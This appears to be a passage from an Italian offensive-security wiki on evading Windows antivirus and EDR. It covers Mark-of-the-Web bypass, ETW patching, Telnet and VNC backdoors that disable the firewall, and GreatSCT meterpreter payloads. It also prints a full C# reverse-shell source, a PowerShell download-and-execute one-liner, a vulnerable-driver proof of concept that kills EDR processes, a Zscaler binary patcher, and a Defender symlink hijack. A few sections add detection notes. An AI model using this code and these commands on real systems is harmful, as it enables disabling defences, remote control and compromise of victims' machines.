- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e quindi caricarli

## SmartScreen & MoTW

Potresti aver visualizzato questa schermata scaricando alcuni eseguibili da internet ed eseguendoli.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione: ciò significa che le applicazioni scaricate raramente attiveranno SmartScreen, che avviserà l'utente finale impedendogli di eseguire il file (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier, creato automaticamente quando si scaricano file da internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption>Controllo dell'ADS Zone.Identifier per un file scaricato da internet.</figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire ai propri payload di ottenere il Mark of The Web consiste nel inserirli in una sorta di container, come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in container di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una dimostrazione dell'elusione di SmartScreen tramite il packaging dei payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti del sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Analogamente a come AMSI viene disabilitato (bypassato), è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space restituisca immediatamente il controllo senza registrare alcun evento. Questo avviene effettuando il patching della funzione in memoria affinché restituisca immediatamente il controllo, disabilitando di fatto il logging di ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da parecchio tempo ed è ancora un ottimo metodo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci soltanto di effettuare il patching di AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma esistono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawning di un nuovo processo sacrificale**, nell'iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, nell'eseguire il codice malevolo e, al termine, nel terminare il nuovo processo. Questo presenta sia vantaggi sia svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro Beacon implant. Ciò significa che, se qualcosa nella nostra azione di post-exploitation va storto o viene rilevato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva**. Lo svantaggio è che c'è una **probabilità maggiore** di essere rilevati dai **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo puoi evitare di dover creare un nuovo processo e di farlo sottoporre a scansione dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon**, poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere altro sul caricamento di C# Assembly, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla Attacker Controlled SMB share**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla SMB share, puoi **eseguire codice arbitrario scritto in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repo indica quanto segue: Defender continua a sottoporre gli script a scansione, ma utilizzando Go, Java, PHP, ecc. abbiamo **maggiore flessibilità per bypassare le signature statiche**. I test con script reverse shell casuali e non offuscati scritti in questi linguaggi hanno avuto esito positivo.

## TokenStomping

Token stomping è una tecnica che consente a un attaccante di **manipolare l'access token o un prodotto di sicurezza come un EDR o un AV**, riducendone i privilegi, in modo che il processo non termini, ma non disponga delle autorizzazioni per verificare la presenza di attività malevole.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile eseguire il deploy di Chrome Remote Desktop sul PC di una vittima, usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il software da https://remotedesktop.google.com/, clicca su "Set up via SSH", quindi clicca sul file MSI per Windows per scaricare il file MSI.
2. Esegui silenziosamente l'installer sulla macchina della vittima (sono richiesti privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca su next. La procedura guidata ti chiederà quindi di autorizzare; clicca sul pulsante Authorize per continuare.
4. Esegui il parametro fornito con alcune modifiche: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin, che consente di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetria presenti in un solo sistema, quindi è praticamente impossibile rimanere completamente non rilevati negli ambienti maturi.

Ogni ambiente che dovrai affrontare avrà i propri punti di forza e le proprie debolezze.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per acquisire una base sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuoverà parti del binario** finché non **scoprirà quale parte Defender** considera malevola, indicandotela.\
Un altro strumento che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred), con un servizio web disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Modifica la porta telnet** (stealth) **e disabilita il firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (servono i download binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi sposta il binario _**winvnc.exe**_ e il file **UltraVNC.ini** **appena** creato all'interno della **vittima**

#### **Connessione reverse**

L'**attaccante** deve **eseguire all'interno del proprio** **host** il binario `vncviewer.exe -listen 5900`, in modo da essere **pronto** a ricevere una **connessione VNC** reverse. Quindi, all'interno della **vittima**: avvia il demone winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per ottenere aiuto, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload XML** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L’attuale Defender terminerà il processo molto rapidamente.**

### Compilazione della nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilala con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco degli obfuscator C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di Python per creare injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR dal Kernel Space

Storm-2603 ha sfruttato una piccola console utility nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire il ransomware. Lo strumento porta con sé il proprio **driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file distribuito sul disco è `ServiceMouse.sys`, ma il binary è il driver legittimamente firmato `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver possiede una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service**, mentre la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo user land.
3. **IOCTL esposti dal driver**
| Codice IOCTL | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario dal disco |
| `0x990001D0` | Scaricare il driver e rimuovere il service |

Proof-of-concept C minimale:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD bypassa completamente le protezioni user-mode; il codice eseguito nel kernel può aprire processi *protected*, terminarli o manomettere gli oggetti del kernel indipendentemente da PPL/PP, ELAM o altre hardening features.

Detection / Mitigation
•  Abilitare la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi *kernel* service e generare alert quando un driver viene caricato da una directory world-writable o non presente nella allow-list.
•  Monitorare gli handle user-mode verso custom device objects seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing dei Posture Check di Zscaler Client Connector tramite Patching del Binary su Disco

**Client Connector** di Zscaler applica localmente le device-posture rules e si basa su Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (un boolean viene inviato al server).
2. Gli endpoint RPC interni verificano soltanto che l'executable connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Tramite il **patching di quattro binary firmati su disco**, entrambi i meccanismi possono essere neutralizzati:

| Binary | Logica originale sottoposta a patch | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni check risulta compliant |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo, anche unsigned, può effettuare il bind alle RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity check sul tunnel | Bypassati tramite short-circuit |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i posture checks risultano **green/compliant**.
* I binary non firmati o modificati possono aprire gli endpoint RPC delle named pipe, ad esempio `\\RPC Control\\ZSATrayManager_talk_to_me`.
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente client-side e semplici signature checks possano essere aggirate con poche patch di byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia signer/level, in modo che solo i protected process con un livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binary abilitato per PPL e controllarne gli argomenti, puoi trasformare una funzionalità benigna, ad esempio il logging, in una write primitive vincolata e supportata da PPL contro le protected directories utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa fa eseguire un processo come PPL
- L'EXE target, e tutte le DLL caricate, devono essere firmati con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un protection level compatibile, corrispondente al signer del binary, ad esempio `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i signer anti-malware e `PROTECTION_LEVEL_WINDOWS` per i signer Windows. Livelli errati causeranno il fallimento della creazione.

Vedi anche un'introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di avvio
- Helper open-source: CreateProcessAsPPL, che seleziona il protection level e inoltra gli argomenti all'EXE target:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Pattern di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` esegue autonomamente un nuovo processo e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con il supporto PPL.
- ClipUp non è in grado di analizzare percorsi contenenti spazi; usa i percorsi brevi 8.3 per puntare a posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad esempio CreateProcessAsPPL).
2) Passa l'argomento del percorso del log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad esempio Defender Platform). Usa i nomi brevi 8.3 se necessario.
3) Se il binario di destinazione viene normalmente aperto/bloccato dall'AV durante l'esecuzione (ad esempio MsMpEng.exe), pianifica la scrittura all'avvio, prima che l'AV venga avviato, installando un servizio auto-start che venga eseguito in modo affidabile in precedenza. Convalida l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio, la scrittura supportata da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per motivi di sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la posizione; la primitive è adatta alla corruzione piuttosto che all'iniezione precisa di contenuto.
- Richiede privilegi local admin/SYSTEM per installare/avviare un servizio e una finestra temporale per il riavvio.
- Il timing è critico: il target non deve essere aperto; l'esecuzione al boot evita i file lock.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, soprattutto quando il parent è un launcher non standard, in prossimità del boot.
- Nuovi servizi configurati per l'avvio automatico di binari sospetti e avviati sistematicamente prima di Defender/AV. Analizza la creazione/modifica dei servizi precedente agli errori di avvio di Defender.
- File integrity monitoring sui binari e sulle directory Platform di Defender; creazioni/modifiche impreviste da parte di processi con protected-process flags.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e utilizzi anomali del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e da quali parent; blocca l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Service hygiene: limita la creazione/modifica dei servizi ad avvio automatico e monitora la manipolazione dell'ordine di avvio.
- Assicurati che tamper protection di Defender e le protezioni early-launch siano abilitate; analizza gli errori di startup che indicano la corruzione dei binari.
- Valuta la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

## Tampering di Microsoft Defender tramite Platform Version Folder Symlink Hijack

Windows Defender sceglie la platform da cui viene eseguito enumerando le sottodirectory in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottodirectory con la stringa di versione lessicograficamente più alta (ad esempio `4.18.25070.5-0`), quindi avvia i processi del servizio Defender da quella posizione (aggiornando di conseguenza i path del servizio e del registro). Questa selezione si affida alle directory entries, inclusi i directory reparse points (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un path scrivibile dall'attaccante e ottenere DLL sideloading o una service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Local Administrator (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di eseguire un reboot o attivare una nuova selezione della platform di Defender (restart del servizio al boot)
- Sono necessari solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della platform si affida alle directory entries e sceglie la versione lessicograficamente più alta senza verificare che il target punti a un path protetto/attendibile.

Step-by-step (esempio)
1) Prepara una clone scrivibile della cartella platform corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con una versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo in `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale posizione.

Opzioni di post-exploitation
- DLL sideloading/code execution: Inserisci/sostituisci DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Consulta la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Terminazione/negazione del servizio: Rimuovi il version-symlink, così al successivo avvio il percorso configurato non verrà risolto e Defender non riuscirà ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce privilege escalation da sola; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing con PIC (in stile Crystal Kit)

I Red teams possono spostare l’evasione runtime dall’impianto C2 direttamente nel modulo target, eseguendo hooking della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall’attaccante. Questo generalizza l’evasione oltre la ridotta superficie API esposta da molti kit (ad es., CreateProcessA) ed estende le stesse protezioni a BOF e DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio high-level
- Staging di un blob PIC accanto al modulo target usando un reflective loader (anteposto o companion). Il PIC deve essere self-contained e position-independent.
